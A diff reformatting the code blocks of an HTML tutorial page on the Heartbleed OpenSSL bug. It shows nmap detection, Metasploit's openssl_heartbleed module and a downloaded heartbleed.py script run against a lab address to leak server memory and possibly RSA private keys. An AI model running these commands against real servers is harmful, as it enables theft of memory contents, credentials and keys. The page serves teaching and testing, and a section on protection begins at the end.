@@ -126,7 +126,7 @@
                             <li><h5>Why is it vulnerable?</h5></li>
                             <p>The vulnerability comes forth from a single line of code in <b>OpenSSL</b>.</p>
                             <code>
-                                <p>memcpy(bp, pl, payload);</p>
+memcpy(bp, pl, payload);
                             </code>
                             <br />
                             
@@ -141,11 +141,11 @@
                                 <li>Nmap</li>
                                 <p>Via nmap you can test your system with the following command:</p>
                                 <code>
-                                    <p># Syntax</p>
-                                    <p>nmap -p [port] --script ssl-heartbleed [target]</p>
-                                    <br />
-                                    <p># Example</p>
-                                    <p>nmap -p 443 --script ssl-heartbleed 10.10.10.79</p>
+# Syntax
+nmap -p [port] --script ssl-heartbleed [target]
+
+# Example
+nmap -p 443 --script ssl-heartbleed 10.10.10.79
                                 </code>
                                 <br />
                                 <li>Online</li>
@@ -155,44 +155,44 @@
                             <p>Due to the nature of this exploit, it will not leave any traces on the target computer. The exploit can be done very easily with a default metasploit module, to start, open up the metasploit CLI: </p>
                             <p><i>** Disclaimer: The following steps are done in <a href="https://www.kali.org/">Kali 2018.1</a> **</i></p>
                             <code>
-                                <p>msfconsole</p>
+msfconsole
                             </code>
                             <br />
                             <p>Next, load the module: </p>
                             <code>
-                                <p>use auxiliary/scanner/ssl/openssl_heartbleed</p>
+use auxiliary/scanner/ssl/openssl_heartbleed
                             </code>
                             <br />
                             <p>You could display the options, but initially most of the options are fine by default. The only things we have to set are RHOSTS, VERBOSE, and optionally THREADS:</p>
                             <code>
-                                <p>set RHOSTS 10.10.10.79</p>
-                                <p>set THREADS 50</p>
-                                <p>set VERBOSE true</p>
-                                <p>exploit</p>
+set RHOSTS 10.10.10.79
+set THREADS 50
+set VERBOSE true
+exploit
                             </code>
                             <br />
                             <p>With every heartbeat you send, 64KB of data will be returned in the output. Note that if you do not set the VERBOSE parameter to true, you will not directly receive this printable output. You should also notice that with every chunk of data you receive, the data is different. That's because you're always retrieving a different part of the targets' memory - always the +64KB of where our heartbeat is allocated in memory.</p>
                             <p>Manually probing the target system, heartbeat after heartbeat is pretty boring, so that's why there are some wonderful people who wrote <a href="https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py">heartbleed.py</a>. This is a script that automates the heartbeats, and even lets you extract the RSA private key if it's found in the 64KB chunk. Download the script by clicking on the link above or via wget:</p>
                             <code>
-                                <p>wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</p>
+wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
                             </code>
                             <br />
                             <p>To run the script, it could be that you'll have to install a missing module. This can be done with pip:</p>
                              <code>
-                                <p># Syntax</p>
-                                <p>sudo pip install [module]</p>
-                                <br />
-                                <p># Example</p>
-                                <p>sudo pip install gmpy</p>
+# Syntax
+sudo pip install [module]
+
+# Example
+sudo pip install gmpy
                             </code>
                             <br />
                             <p>To run the script, you can specify the following parameters:</p>
                             <code>
-                                <p># Syntax</p>
-                                <p>python heartbleed.py -p [port] -n [amount of retries] -e [ip]</p>
-                                <br />
-                                <p># Example</p>
-                                <p>python heartbleed.py -p 443 -n 2000 -e 10.10.10.79</p>
+# Syntax
+python heartbleed.py -p [port] -n [amount of retries] -e [ip]
+
+# Example
+python heartbleed.py -p 443 -n 2000 -e 10.10.10.79
                             </code>
                             <br />
                             <p>The parameters do the following:</p>
@@ -202,7 +202,7 @@
                             <br />
                             <p>If you want extra help with this script, you can always just type in:</p>
                             <code>
-                                <p>python heartbleed.py -h</p>
+python heartbleed.py -h
                             </code>
                             <br />
                             <li><h5>How to protect against heartbleed</h5></li>
